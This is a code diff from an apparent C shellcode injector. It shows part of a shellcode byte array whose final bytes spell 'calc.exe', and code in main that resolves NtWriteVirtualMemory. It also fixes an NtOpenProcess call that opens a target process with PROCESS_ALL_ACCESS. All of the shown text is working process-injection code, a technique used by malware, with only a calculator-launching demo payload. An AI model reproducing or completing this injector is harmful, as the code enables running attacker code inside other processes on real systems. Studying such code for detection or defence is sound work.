@@ -111,7 +111,6 @@ unsigned char payload[] = {
 "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
 "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
 };
-size_t payload_len = sizeof(payload);
 
 // Debug Symbols
 char ok[4] = "(+)";
@@ -204,7 +203,7 @@ int main(int argc, char* argv[]){
     printf("\n%s Found NtWriteVirtualMemory %s 0x%p", ok, ar, &NtWriteVirtualMemory);
     printf("\n\t%s Created pointer to NtWriteVirtualMemory", in);
 
-    status = NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &objectAttributes, clientId);
+    status = NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &objectAttributes, &clientId);
     if (!hProc || hProc == NULL){
        printf("\n%s Couldnt get handle to %s [%d], error: %ld", err, procname, PID, GetLastError());
        CloseHandle(hNTDLL);
